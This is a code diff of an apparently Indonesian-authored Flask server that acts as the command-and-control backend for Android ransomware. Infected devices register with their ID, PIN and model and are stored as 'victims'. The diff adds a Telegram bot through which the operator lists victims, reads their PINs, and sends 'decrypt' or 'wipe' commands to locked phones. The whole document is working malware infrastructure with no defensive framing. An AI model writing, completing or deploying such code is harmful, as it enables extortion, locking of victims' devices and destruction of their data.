@@ -26,8 +26,7 @@ def init_db():
         first_seen TEXT,
         last_active TEXT,
         progress INTEGER DEFAULT 0,
-        is_locked INTEGER DEFAULT 1,
-        status TEXT DEFAULT 'encrypted'
+        is_locked INTEGER DEFAULT 1
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS commands (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -44,7 +43,7 @@ init_db()
 # ========== FLASK APP ==========
 app = Flask(__name__)
 
-# ========== FUNGSI KIRIM TELEGRAM (SYNC, PAKAI REQUESTS) ==========
+# ========== FUNGSI KIRIM TELEGRAM ==========
 def send_telegram(text):
     if not BOT_TOKEN or not ADMIN_CHAT_ID:
         print("BOT_TOKEN or ADMIN_CHAT_ID not set")
@@ -56,7 +55,7 @@ def send_telegram(text):
     except Exception as e:
         print("Telegram error:", e)
 
-# ========== ENDPOINTS ==========
+# ========== ENDPOINTS UNTUK ANDROID ==========
 @app.route('/register', methods=['POST'])
 def register():
     data = request.get_json()
@@ -82,8 +81,9 @@ def register():
     conn.commit()
     conn.close()
     
-    # Kirim notifikasi ke Telegram (synchronous, pakai thread biar tidak blocking)
-    threading.Thread(target=send_telegram, args=(f"🔴 *NEW VICTIM*\n\nDevice ID: `{device_id}`\nPIN: `{pin}`\nModel: {model}\nTime: {now}",)).start()
+    # Kirim notifikasi ke admin
+    msg = f"🔴 *NEW VICTIM*\n\nDevice ID: `{device_id}`\nPIN: `{pin}`\nModel: {model}\nTime: {now}"
+    threading.Thread(target=send_telegram, args=(msg,)).start()
     
     return jsonify({"status": "ok"})
 
@@ -127,5 +127,115 @@ def get_command(device_id):
 def ping():
     return jsonify({"status": "alive"})
 
-if __name__ == '__main__':
+# ========== HANDLER BOT TELEGRAM (via getUpdates polling) ==========
+def bot_polling():
+    last_update_id = 0
+    while True:
+        try:
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id+1}&timeout=30"
+            resp = requests.get(url, timeout=35)
+            if resp.status_code == 200:
+                data = resp.json()
+                if data['ok']:
+                    for update in data['result']:
+                        last_update_id = update['update_id']
+                        if 'message' in update:
+                            msg = update['message']
+                            chat_id = msg['chat']['id']
+                            # Hanya respons ke admin
+                            if str(chat_id) != str(ADMIN_CHAT_ID):
+                                continue
+                            text = msg.get('text', '')
+                            if text.startswith('/'):
+                                handle_command(chat_id, text)
+        except Exception as e:
+            print("Bot polling error:", e)
+        threading.Event().wait(1)
+
+def handle_command(chat_id, text):
+    parts = text.strip().split()
+    cmd = parts[0].lower()
+    
+    if cmd == '/start':
+        send_telegram_to_chat(chat_id, "🤖 *C2 Bot Active*\nCommands:\n/victims\n/decrypt <device_id>\n/wipe <device_id>\n/info <device_id>")
+    elif cmd == '/victims':
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("SELECT device_id, progress, is_locked FROM victims ORDER BY last_active DESC")
+        rows = c.fetchall()
+        conn.close()
+        if not rows:
+            send_telegram_to_chat(chat_id, "No victims.")
+        else:
+            msg = "*Victims:*\n"
+            for r in rows:
+                status = "🔒" if r[2] else "🔓"
+                msg += f"{status} `{r[0]}` - {r[1]}%\n"
+            send_telegram_to_chat(chat_id, msg)
+    elif cmd == '/decrypt' and len(parts) > 1:
+        device_id = parts[1]
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("SELECT device_id FROM victims WHERE device_id=?", (device_id,))
+        if c.fetchone():
+            c.execute("INSERT INTO commands (device_id, command, issued_at) VALUES (?, ?, ?)",
+                      (device_id, "decrypt", datetime.now().isoformat()))
+            conn.commit()
+            send_telegram_to_chat(chat_id, f"✅ Decrypt command sent to `{device_id}`")
+        else:
+            send_telegram_to_chat(chat_id, f"❌ Device `{device_id}` not found")
+        conn.close()
+    elif cmd == '/wipe' and len(parts) > 1:
+        device_id = parts[1]
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("SELECT device_id FROM victims WHERE device_id=?", (device_id,))
+        if c.fetchone():
+            c.execute("INSERT INTO commands (device_id, command, issued_at) VALUES (?, ?, ?)",
+                      (device_id, "wipe", datetime.now().isoformat()))
+            conn.commit()
+            send_telegram_to_chat(chat_id, f"⚠️ WIPE command sent to `{device_id}`")
+        else:
+            send_telegram_to_chat(chat_id, f"❌ Device `{device_id}` not found")
+        conn.close()
+    elif cmd == '/info' and len(parts) > 1:
+        device_id = parts[1]
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("SELECT pin, progress, is_locked, model, last_active FROM victims WHERE device_id=?", (device_id,))
+        row = c.fetchone()
+        conn.close()
+        if row:
+            pin, prog, locked, model, last = row
+            status = "Locked" if locked else "Unlocked"
+            msg = f"*Device:* `{device_id}`\nPIN: `{pin}`\nProgress: {prog}%\nStatus: {status}\nModel: {model}\nLast: {last[:16]}"
+            send_telegram_to_chat(chat_id, msg)
+        else:
+            send_telegram_to_chat(chat_id, f"❌ Device `{device_id}` not found")
+    else:
+        send_telegram_to_chat(chat_id, "Unknown command. Use /start")
+
+def send_telegram_to_chat(chat_id, text):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
+        requests.post(url, json=payload, timeout=5)
+    except Exception as e:
+        print("Send to chat error:", e)
+
+# ========== RUN FLASK + BOT POLLING ==========
+def run_flask():
     app.run(host='0.0.0.0', port=PORT)
+
+if __name__ == '__main__':
+    # Start Flask di thread terpisah
+    t_flask = threading.Thread(target=run_flask)
+    t_flask.daemon = True
+    t_flask.start()
+    # Start bot polling di thread utama
+    if BOT_TOKEN and ADMIN_CHAT_ID:
+        bot_polling()
+    else:
+        print("BOT_TOKEN or ADMIN_CHAT_ID missing, bot not started")
+        # Tetap jalankan Flask saja
+        run_flask()
